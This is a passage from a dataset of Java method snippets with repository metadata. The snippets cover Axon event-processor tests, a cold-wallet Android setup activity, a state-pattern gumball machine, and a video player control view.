verify(subscribingEventProcessor).shutDown();\n        verify(markerAwareTrackingEventProcessor).startReplay(startPosition, replayMarkerEvent);\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/test/java/engineering/everest/lhotse/axon/replay/SwitchingEventProcessorTest.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55200, "method_name": "willGetReplayingStatus", "class_name": "SwitchingEventProcessorTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void willGetReplayingStatus() {\n        assertFalse(switchingEventProcessor.isReplaying());\n        switchingEventProcessor.startReplay(startPosition, replayMarkerEvent);\n        assertTrue(switchingEventProcessor.isReplaying());\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/test/java/engineering/everest/lhotse/axon/replay/SwitchingEventProcessorTest.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55201, "method_name": "getName_WillDelegate", "class_name": "SwitchingEventProcessorTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void getName_WillDelegate() {\n        when(subscribingEventProcessor.getName()).thenReturn(\"Jim\");\n\n        assertEquals(\"Jim\", switchingEventProcessor.getName());\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/test/java/engineering/everest/lhotse/axon/replay/SwitchingEventProcessorTest.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55202, "method_name": "start_IsRegisteredAsAnStartupHandler", "class_name": "SwitchingEventProcessorTest", "params": [], "throws": ["NoSuchMethodException"], "modifiers": [], "return_type": "void", "snippet": "    void start_IsRegisteredAsAnStartupHandler() throws NoSuchMethodException {\n        Method startMethod = SwitchingEventProcessor.class.getDeclaredMethod(\"start\");\n        assertTrue(startMethod.isAnnotationPresent(StartHandler.class));\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/test/java/engineering/everest/lhotse/axon/replay/SwitchingEventProcessorTest.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55203, "method_name": "start_WillDelegate", "class_name": "SwitchingEventProcessorTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void start_WillDelegate() {\n        switchingEventProcessor.start();\n\n        verify(subscribingEventProcessor).start();\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/test/java/engineering/everest/lhotse/axon/replay/SwitchingEventProcessorTest.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55204, "method_name": "shutdown_IsRegisteredAsAShutdownHandler", "class_name": "SwitchingEventProcessorTest", "params": [], "throws": ["NoSuchMethodException"], "modifiers": [], "return_type": "void", "snippet": "    void shutdown_IsRegisteredAsAShutdownHandler() throws NoSuchMethodException {\n        Method startMethod = SwitchingEventProcessor.class.getDeclaredMethod(\"shutDown\");\n        assertTrue(startMethod.isAnnotationPresent(ShutdownHandler.class));\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/test/java/engineering/everest/lhotse/axon/replay/SwitchingEventProcessorTest.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55205, "method_name": "shutdown_WillDelegate", "class_name": "SwitchingEventProcessorTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void shutdown_WillDelegate() {\n        switchingEventProcessor.shutDown();\n\n        verify(subscribingEventProcessor).shutDown();\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/test/java/engineering/everest/lhotse/axon/replay/SwitchingEventProcessorTest.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55206, "method_name": "onCreate", "class_name": "SetupVaultActivity", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        DataBindingUtil.setContentView(this, R.layout.activity_setup_vault);\n        setupNavController(savedInstanceState);\n\n        if (getIntent() != null) {\n            String password = getIntent().getStringExtra(PASSWORD);\n            SetupVaultViewModel model = ViewModelProviders.of(this).get(SetupVaultViewModel.class);\n            model.setPassword(password);\n        }\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/SetupVaultActivity.java", "stars": "13", "class_props": {"extends": "FullScreenActivity", "implements": null, "modifiers": ["public"]}}, {"id": 55207, "method_name": "setupNavController", "class_name": "SetupVaultActivity", "params": ["Bundle"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setupNavController(Bundle savedInstanceState) {\n        NavHostFragment navHostFragment =\n                (NavHostFragment) getSupportFragmentManager().findFragmentById(R.id.nav_host_fragment);\n        NavInflater inflater = Objects.requireNonNull(navHostFragment).getNavController().getNavInflater();\n        NavGraph graph = inflater.inflate(R.navigation.nav_graph_setup);\n        Intent intent = getIntent();\n\n        if (savedInstanceState != null) {\n            isSetupVault = savedInstanceState.getBoolean(IS_SETUP_VAULT);\n        } else {\n            isSetupVault = intent != null && intent.getBooleanExtra(IS_SETUP_VAULT, true);\n        }\n        if (!isSetupVault) {\n            graph.setStartDestination(R.id.setupVaultFragment);\n        }\n        navHostFragment.getNavController().setGraph(graph);\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/SetupVaultActivity.java", "stars": "13", "class_props": {"extends": "FullScreenActivity", "implements": null, "modifiers": ["public"]}}, {"id": 55208, "method_name": "onSaveInstanceState", "class_name": "SetupVaultActivity", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onSaveInstanceState(@NonNull Bundle outState) {\n        super.onSaveInstanceState(outState);\n        outState.putBoolean(IS_SETUP_VAULT, isSetupVault);\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/SetupVaultActivity.java", "stars": "13", "class_props": {"extends": "FullScreenActivity", "implements": null, "modifiers": ["public"]}}, {"id": 55209, "method_name": "insertQuarter", "class_name": "GumballMachine", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void insertQuarter() {\n        currentState.insertQuarter();\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/State%20Pattern/src/GumballMachine.java", "stars": "38", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55210, "method_name": "ejectQuarter", "class_name": "GumballMachine", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void ejectQuarter() {\n        currentState.ejectQuarter();\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/State%20Pattern/src/GumballMachine.java", "stars": "38", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55211, "method_name": "rotateCrank", "class_name": "GumballMachine", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void rotateCrank() {\n        currentState.rotateCrank();\n        currentState.dispense();\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/State%20Pattern/src/GumballMachine.java", "stars": "38", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55212, "method_name": "dispense", "class_name": "GumballMachine", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void dispense() {\n        System.out.println(\"Gumball released\");\n        if (gumBallCount != 0)\n            gumBallCount -= 1;\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/State%20Pattern/src/GumballMachine.java", "stars": "38", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55213, "method_name": "setState", "class_name": "GumballMachine", "params": ["IState"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setState(IState state) {\n        this.currentState = state;\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/State%20Pattern/src/GumballMachine.java", "stars": "38", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55214, "method_name": "getNoQuarterState", "class_name": "GumballMachine", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IState", "snippet": "    public IState getNoQuarterState() {\n        return noQuarterState;\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/State%20Pattern/src/GumballMachine.java", "stars": "38", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55215, "method_name": "getHasQuarterState", "class_name": "GumballMachine", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IState", "snippet": "    public IState getHasQuarterState() {\n        return hasQuarterState;\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/State%20Pattern/src/GumballMachine.java", "stars": "38", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55216, "method_name": "getSoldOutState", "class_name": "GumballMachine", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IState", "snippet": "    public IState getSoldOutState() {\n        return soldOutState;\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/State%20Pattern/src/GumballMachine.java", "stars": "38", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55217, "method_name": "getSoldState", "class_name": "GumballMachine", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IState", "snippet": "    public IState getSoldState() {\n        return soldState;\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/State%20Pattern/src/GumballMachine.java", "stars": "38", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55218, "method_name": "getGumBallCount", "class_name": "GumballMachine", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getGumBallCount() {\n        return gumBallCount;\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/State%20Pattern/src/GumballMachine.java", "stars": "38", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55219, "method_name": "init", "class_name": "GSYVideoControlView", "params": ["Context"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void init(Context context) {\n        super.init(context);\n\n        mStartButton = findViewById(R.id.start);\n        mTitleTextView = (TextView) findViewById(R.id.title);\n        mBackButton = (ImageView) findViewById(R.id.back);\n        mFullscreenButton = (ImageView) findViewById(R.id.fullscreen);\n        mProgressBar = (SeekBar) findViewById(R.id.progress);\n        mCurrentTimeTextView = (TextView) findViewById(R.id.current);\n        mTotalTimeTextView = (TextView) findViewById(R.id.total);\n        mBottomContainer = (ViewGroup) findViewById(R.id.layout_bottom);\n        mTopContainer = (ViewGroup) findViewById(R.id.layout_top);\n        mBottomProgressBar = (ProgressBar) findViewById(R.id.bottom_progressbar);\n        mThumbImageViewLayout = (RelativeLayout) findViewById(R.id.thumb);\n        mLockScreen = (ImageView) findViewById(R.id.lock_screen);\n\n        mLoadingProgressBar = findViewById(R.id.loading);\n\n\n        if (isInEditMode())\n            return;\n\n        if (mStartButton != null) {\n            mStartButton.setOnClickListener(this);\n        }\n\n        if (mFullscreenButton != null) {\n            mFullscreenButton.setOnClickListener(this);\n            mFullscreenButton.setOnTouchListener(this);\n        }\n\n        if (mProgressBar != null) {\n            mProgressBar.setOnSeekBarChangeListener(this);\n        }\n\n        if (mBottomContainer != null) {\n            mBottomContainer.setOnClickListener(this);\n        }\n\n        if (mTextureViewContainer != null) {\n            mTextureViewContainer.setOnClickListener(this);\n            mTextureViewContainer.setOnTouchListener(this);\n        }\n\n        if (mProgressBar != null) {\n            mProgressBar.setOnTouchListener(this);\n        }\n\n        if (mThumbImageViewLayout != null) {\n            mThumbImageViewLayout.setVisibility(GONE);\n            mThumbImageViewLayout.setOnClickListener(this);\n        }\n        if (mThumbImageView != null && !mIfCurrentIsFullscreen && mThumbImageViewLayout != null) {\n            mThumbImageViewLayout.removeAllViews();\n            resolveThumbImage(mThumbImageView);\n        }\n\n        if (mBackButton != null)\n            mBackButton.setOnClickListener(this);\n\n        if (mLockScreen != null) {\n            mLockScreen.setVisibility(GONE);\n            mLockScreen.setOnClickListener(new OnClickListener() {\n                @Override\n                public void onClick(View v) {\n                    if (mCurrentState == CURRENT_STATE_AUTO_COMPLETE ||\n                            mCurrentState == CURRENT_STATE_ERROR) {\n                        return;\n                    }\n                    lockTouchLogic();\n                    if (mLockClickListener != null) {\n                        mLockClickListener.onClick(v, mLockCurScreen);\n                    }\n                }\n            });\n        }\n\n        if (getActivityContext() != null) {\n            mSeekEndOffset = CommonUtil.dip2px(getActivityContext(), 50);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55220, "method_name": "onDetachedFromWindow", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDetachedFromWindow() {\n        super.onDetachedFromWindow();\n\n        Debuger.printfLog(GSYVideoControlView.this.hashCode() + \"------------------------------ dismiss onDetachedFromWindow\");\n        cancelProgressTimer();\n        cancelDismissControlViewTimer();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55221, "method_name": "onAutoCompletion", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onAutoCompletion() {\n        super.onAutoCompletion();\n        if (mLockCurScreen) {\n            lockTouchLogic();\n            mLockScreen.setVisibility(GONE);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55222, "method_name": "onError", "class_name": "GSYVideoControlView", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onError(int what, int extra) {\n        super.onError(what, extra);\n        if (mLockCurScreen) {\n            lockTouchLogic();\n            mLockScreen.setVisibility(GONE);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55223, "method_name": "setStateAndUi", "class_name": "GSYVideoControlView", "params": ["int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setStateAndUi(int state) {\n        mCurrentState = state;\n        if ((state == CURRENT_STATE_NORMAL && isCurrentMediaListener())\n                || state == CURRENT_STATE_AUTO_COMPLETE || state == CURRENT_STATE_ERROR) {\n            mHadPrepared = false;\n        }\n\n        switch (mCurrentState) {\n            case CURRENT_STATE_NORMAL:\n                if (isCurrentMediaListener()) {\n                    Debuger.printfLog(GSYVideoControlView.this.hashCode() + \"------------------------------ dismiss CURRENT_STATE_NORMAL\");\n                    cancelProgressTimer();\n                    getGSYVideoManager().releaseMediaPlayer();\n                    releasePauseCover();\n                    mBufferPoint = 0;\n                    mSaveChangeViewTIme = 0;\n                    if (mAudioManager != null) {\n                        mAudioManager.abandonAudioFocus(onAudioFocusChangeListener);\n                    }\n                }\n                releaseNetWorkState();\n                break;\n            case CURRENT_STATE_PREPAREING:\n                resetProgressAndTime();\n                break;\n            case CURRENT_STATE_PLAYING:\n                if (isCurrentMediaListener()) {\n                    Debuger.printfLog(GSYVideoControlView.this.hashCode() + \"------------------------------ CURRENT_STATE_PLAYING\");\n                    startProgressTimer();\n                }\n                break;\n            case CURRENT_STATE_PAUSE:\n                Debuger.printfLog(GSYVideoControlView.this.hashCode() + \"------------------------------ CURRENT_STATE_PAUSE\");\n                startProgressTimer();\n                break;\n            case CURRENT_STATE_ERROR:\n                if (isCurrentMediaListener()) {\n                    getGSYVideoManager().releaseMediaPlayer();\n                }\n                break;\n            case CURRENT_STATE_AUTO_COMPLETE:\n                Debuger.printfLog(GSYVideoControlView.this.hashCode() + \"------------------------------ dismiss CURRENT_STATE_AUTO_COMPLETE\");\n                cancelProgressTimer();\n                if (mProgressBar != null) {\n                    mProgressBar.setProgress(100);\n                }\n                if (mCurrentTimeTextView != null && mTotalTimeTextView != null) {\n                    mCurrentTimeTextView.setText(mTotalTimeTextView.getText());\n                }\n                if (mBottomProgressBar != null) {\n                    mBottomProgressBar.setProgress(100);\n                }\n                break;\n        }\n        resolveUIState(state);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55224, "method_name": "setSmallVideoTextureView", "class_name": "GSYVideoControlView", "params": ["View"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setSmallVideoTextureView(View.OnTouchListener onTouchListener) {\n        super.setSmallVideoTextureView(onTouchListener);\n        //\u5c0f\u7a97\u53e3\u64ad\u653e\u505c\u6b62\u4e86\u4e5f\u53ef\u4ee5\u79fb\u52a8\n        if (mThumbImageViewLayout != null) {\n            mThumbImageViewLayout.setOnTouchListener(onTouchListener);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55225, "method_name": "onClick", "class_name": "GSYVideoControlView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClick(View v) {\n        int i = v.getId();\n        if (mHideKey && mIfCurrentIsFullscreen) {\n            hideNavKey(mContext);\n        }\n        if (i == R.id.start) {\n            clickStartIcon();\n        } else if (i == R.id.surface_container && mCurrentState == CURRENT_STATE_ERROR) {\n            if (mVideoAllCallBack != null) {\n                Debuger.printfLog(\"onClickStartError\");\n                mVideoAllCallBack.onClickStartError(mOriginUrl, mTitle, this);\n            }\n            prepareVideo();\n        } else if (i == R.id.thumb) {\n            if (!mThumbPlay) {\n                return;\n            }\n            if (TextUtils.isEmpty(mUrl)) {\n                Debuger.printfError(\"********\" + getResources().getString(R.string.no_url));\n                //Toast.makeText(getActivityContext(), getResources().getString(R.string.no_url), Toast.LENGTH_SHORT).show();\n                return;\n            }\n            if (mCurrentState == CURRENT_STATE_NORMAL) {\n                if (isShowNetConfirm()) {\n                    showWifiDialog();\n                    return;\n                }\n                startPlayLogic();\n            } else if (mCurrentState == CURRENT_STATE_AUTO_COMPLETE) {\n                onClickUiToggle();\n            }\n        } else if (i == R.id.surface_container) {\n            if (mVideoAllCallBack != null && isCurrentMediaListener()) {\n                if (mIfCurrentIsFullscreen) {\n                    Debuger.printfLog(\"onClickBlankFullscreen\");\n                    mVideoAllCallBack.onClickBlankFullscreen(mOriginUrl, mTitle, GSYVideoControlView.this);\n                } else {\n                    Debuger.printfLog(\"onClickBlank\");\n                    mVideoAllCallBack.onClickBlank(mOriginUrl, mTitle, GSYVideoControlView.this);\n                }\n            }\n            startDismissControlViewTimer();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55226, "method_name": "onTouch", "class_name": "GSYVideoControlView", "params": ["View", "MotionEvent"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onTouch(View v, MotionEvent event) {\n\n        int id = v.getId();\n        float x = event.getX();\n        float y = event.getY();\n\n        if (mIfCurrentIsFullscreen && mLockCurScreen && mNeedLockFull) {\n            onClickUiToggle();\n            startDismissControlViewTimer();\n            return true;\n        }\n\n        if (id == R.id.fullscreen) {\n            return false;\n        }\n\n        if (id == R.id.surface_container) {\n            switch (event.getAction()) {\n                case MotionEvent.ACTION_DOWN:\n\n                    touchSurfaceDown(x, y);\n\n                    break;\n                case MotionEvent.ACTION_MOVE:\n                    float deltaX = x - mDownX;\n                    float deltaY = y - mDownY;\n                    float absDeltaX = Math.abs(deltaX);\n                    float absDeltaY = Math.abs(deltaY);\n\n                    if ((mIfCurrentIsFullscreen && mIsTouchWigetFull)\n                            || (mIsTouchWiget && !mIfCurrentIsFullscreen)) {\n                        if (!mChangePosition && !mChangeVolume && !mBrightness) {\n                            touchSurfaceMoveFullLogic(absDeltaX, absDeltaY);\n                        }\n                    }\n                    touchSurfaceMove(deltaX, deltaY, y);\n\n                    break;\n                case MotionEvent.ACTION_UP:\n\n                    startDismissControlViewTimer();\n\n                    touchSurfaceUp();\n\n\n                    Debuger.printfLog(GSYVideoControlView.this.hashCode() + \"------------------------------ surface_container ACTION_UP\");\n\n                    startProgressTimer();\n\n                    //\u4e0d\u8981\u548c\u9690\u85cf\u865a\u62df\u6309\u952e\u540e\uff0c\u6ed1\u51fa\u865a\u62df\u6309\u952e\u51b2\u7a81\n                    if (mHideKey && mShowVKey) {\n                        return true;\n                    }\n                    break;\n            }\n            gestureDetector.onTouchEvent(event);\n        } else if (id == R.id.progress) {\n            switch (event.getAction()) {\n                case MotionEvent.ACTION_DOWN:\n                    cancelDismissControlViewTimer();\n                case MotionEvent.ACTION_MOVE:\n                    cancelProgressTimer();\n                    ViewParent vpdown = getParent();\n                    while (vpdown != null) {\n                        vpdown.requestDisallowInterceptTouchEvent(true);\n                        vpdown = vpdown.getParent();\n                    }\n                    break;\n                case MotionEvent.ACTION_UP:\n                    startDismissControlViewTimer();\n\n                    Debuger.printfLog(GSYVideoControlView.this.hashCode() + \"------------------------------ progress ACTION_UP\");\n                    startProgressTimer();\n                    ViewParent vpup = getParent();\n                    while (vpup != null) {\n                        vpup.requestDisallowInterceptTouchEvent(false);\n                        vpup = vpup.getParent();\n                    }\n                    mBrightnessData = -1f;\n                    break;\n            }\n        }\n\n        return false;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55227, "method_name": "setUp", "class_name": "GSYVideoControlView", "params": ["String", "boolean", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setUp(String url, boolean cacheWithPlay, String title) {\n        return setUp(url, cacheWithPlay, (File) null, title);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55228, "method_name": "setUp", "class_name": "GSYVideoControlView", "params": ["String", "boolean", "File", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setUp(String url, boolean cacheWithPlay, File cachePath, String title) {\n        if (super.setUp(url, cacheWithPlay, cachePath, title)) {\n            if (title != null && mTitleTextView != null) {\n                mTitleTextView.setText(title);\n            }\n            if (mIfCurrentIsFullscreen) {\n                if (mFullscreenButton != null)\n                    mFullscreenButton.setImageResource(getShrinkImageRes());\n            } else {\n                if (mFullscreenButton != null)\n                    mFullscreenButton.setImageResource(getEnlargeImageRes());\n            }\n            return true;\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55229, "method_name": "onProgressChanged", "class_name": "GSYVideoControlView", "params": ["SeekBar", "int", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onProgressChanged(SeekBar seekBar, int progress, boolean fromUser) {\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55230, "method_name": "onStartTrackingTouch", "class_name": "GSYVideoControlView", "params": ["SeekBar"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStartTrackingTouch(SeekBar seekBar) {\n        mHadSeekTouch = true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55231, "method_name": "onStopTrackingTouch", "class_name": "GSYVideoControlView", "params": ["SeekBar"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStopTrackingTouch(SeekBar seekBar) {\n        if (mVideoAllCallBack != null && isCurrentMediaListener()) {\n            if (isIfCurrentIsFullscreen()) {\n                Debuger.printfLog(\"onClickSeekbarFullscreen\");\n                mVideoAllCallBack.onClickSeekbarFullscreen(mOriginUrl, mTitle, this);\n            } else {\n                Debuger.printfLog(\"onClickSeekbar\");\n                mVideoAllCallBack.onClickSeekbar(mOriginUrl, mTitle, this);\n            }\n        }\n        if (getGSYVideoManager() != null && mHadPlay) {\n            try {\n                int time = seekBar.getProgress() * getDuration() / 100;\n                getGSYVideoManager().seekTo(time);\n            } catch (Exception e) {\n                Debuger.printfWarning(e.toString());\n            }\n        }\n        mHadSeekTouch = false;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55232, "method_name": "onPrepared", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPrepared() {\n        setTextAndProgress(0, true);\n        super.onPrepared();\n        if (mCurrentState != CURRENT_STATE_PREPAREING) return;\n        startProgressTimer();\n\n        Debuger.printfLog(GSYVideoControlView.this.hashCode() + \"------------------------------ surface_container onPrepared\");\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55233, "method_name": "onBufferingUpdate", "class_name": "GSYVideoControlView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBufferingUpdate(final int percent) {\n        post(new Runnable() {\n            @Override\n            public void run() {\n                if (mCurrentState != CURRENT_STATE_NORMAL && mCurrentState != CURRENT_STATE_PREPAREING) {\n                    if (percent != 0) {\n                        setTextAndProgress(percent);\n                        mBufferPoint = percent;\n                        Debuger.printfLog(\"Net speed: \" + getNetSpeedText() + \" percent \" + percent);\n                    }\n                    if (mProgressBar == null) {\n                        return;\n                    }\n                    //\u5faa\u73af\u6e05\u9664\u8fdb\u5ea6\n                    if (mLooping && mHadPlay && percent == 0 && mProgressBar.getProgress() >= (mProgressBar.getMax() - 1)) {\n                        loopSetProgressAndTime();\n                    }\n                }\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55234, "method_name": "prepareVideo", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void prepareVideo() {\n        if (mSetUpLazy) {\n            super.setUp(mOriginUrl,\n                    mCache,\n                    mCachePath,\n                    mMapHeadData,\n                    mTitle);\n        }\n        super.prepareVideo();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55235, "method_name": "touchSurfaceDown", "class_name": "GSYVideoControlView", "params": ["float", "float"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void touchSurfaceDown(float x, float y) {\n        mTouchingProgressBar = true;\n        mDownX = x;\n        mDownY = y;\n        mMoveY = 0;\n        